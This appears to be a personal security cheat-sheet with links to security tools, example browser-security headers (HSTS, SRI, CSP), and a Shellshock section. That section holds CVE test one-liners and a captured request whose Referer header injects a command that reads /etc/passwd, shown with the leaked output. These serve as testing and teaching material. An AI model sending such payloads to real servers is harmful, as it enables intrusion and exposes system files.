Security
-

[map](http://map.norsecorp.com/)
[xss](https://www.openbugbounty.org/)
[vulnerabilities](http://cve.mitre.org/)
[twitter](https://twitter.com/MisterRobot245/following/)
[check dns](https://dnsspy.io/)
[check site](https://observatory.mozilla.org/)
[check headers](https://securityheaders.com)

#### Browser security

````
Public-Key-Pins: pin-sha256="<pin-value>"; max-age=<expire-time>; includeSubDomains; report-uri="<uri>"
````

HTTP Strict-Transport-Security (HSTS):
````
Strict-Transport-Security: max-age=<expire-time-in-seconds>; includeSubDomains; preload
````
* client should interact over https
* protects against "downgrade attack"
* relies on "trust on first use" (TOFU)

Subresource Integrity (SRI):
````html
<script src="https://example.com/example-framework.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous"></script>
````

Content-Security-Policy (CSP):
````html
*|none|self

<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
````
Header:
````
Content-Security-Policy: upgrade-insecure-requests;
````

````
Content-Security-Policy-Report-Only: default-src https:; report-uri /csp-violation-report-endpoint/
````

#### Shellshock (bashdoor, CVE-2014-6271)

````
# CVE-2014-6271
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"

# CVE-2014-7169
env X='() { (a)=>\' bash -c "echo date"; cat echo

# CVE-2014-7186
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
echo "CVE-2014-7186 vulnerable, redir_stack"

# CVE-2014-7187
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
echo "CVE-2014-7187 vulnerable, word_lineno"
````

````
GET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)

HTTP/1.0 200 OK
Server: nginx/1.2.1
Date: Fri, 26 Sep 2014 11:22:43 GMT
Content-Type: text/html
NS: root:x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/bin/sh
bin: x:2:2:bin:/bin:/bin/sh
sys: x:3:3:sys:/dev:/bin/sh
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/bin/sh
man: x:6:12:man:/var/cache/man:/bin/sh
lp: x:7:7:lp:/var/spool/lpd:/bin/sh
mail: x:8:8:mail:/var/mail:/bin/sh
news: x:9:9:news:/var/spool/news:/bin/sh
uucp: x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy: x:13:13:proxy:/bin:/bin/sh
www-data: x:33:33:www-data:/var/www:/bin/sh
backup: x:34:34:backup:/var/backups:/bin/sh
list: x:38:38:Mailing List Manager:/var/list:/bin/sh
irc: x:39:39:ircd:/var/run/ircd:/bin/sh
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody: x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid: x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim: x:101:103::/var/spool/exim4:/bin/false
messagebus: x:102:106::/var/run/dbus:/bin/false
avahi: x:103:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
sshd: x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql: x:105:111:MySQL Server,,,:/nonexistent:/bin/false
Connection: close
````

#### Man-In-The-Middle

#### Phishing

#### DNS hijacking
